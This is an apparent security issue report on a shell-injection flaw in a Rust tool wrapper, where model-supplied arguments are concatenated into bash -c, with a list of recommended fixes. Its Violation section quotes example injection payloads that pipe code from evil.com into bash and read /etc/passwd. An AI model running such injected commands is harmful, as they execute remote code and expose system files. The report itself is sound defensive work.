title: Chainlink tool: raw arg interpolation into bash -c enables shell injection
description:
Steps to reproduce:
1. 

Expected: 
Actual: 

**Dimension:** Security and Access (OWASP A03 Injection)

**Location:** /home/doll/OpenClaudia/src/tools/chainlink.rs lines 17-32

**Violation:**
execute_chainlink takes the model-supplied 'args' string and concatenates it into a shell command: format!("chainlink {cmd_args}") then passes the whole thing to bash -c. No quoting, no argument splitting, no allowlist of subcommands. An adversarial 'args' value such as 'list; curl evil.com/x | bash' or 'close 1 && cat /etc/passwd' will execute arbitrary shell. The injection is identical to SQLi: concatenating user data into a command interpreter without parameterization.

**Mandated Refactor:**
1. Do NOT shell out. Invoke crosslink via Command::new("crosslink").args(parsed_args) directly, bypassing bash entirely.
2. Parse 'args' with shlex or shell-words to split into argv tokens, then validate the first token against an allowlist: ['create','close','comment','label','list','show','subissue','session'].
3. Reject tokens containing shell metacharacters (;, |, &, \$, backtick, <, >, newline) at the perimeter before any further processing.
4. Remove the Windows-specific Git Bash fallback (lines 17-28); Command::new("chainlink") works cross-platform and does not require a shell.
5. Add Result<Value, McpError>-style structured error returns instead of stringly-typed '(String, bool)' so the caller can distinguish 'chainlink not installed' from 'invalid subcommand' without substring matching.
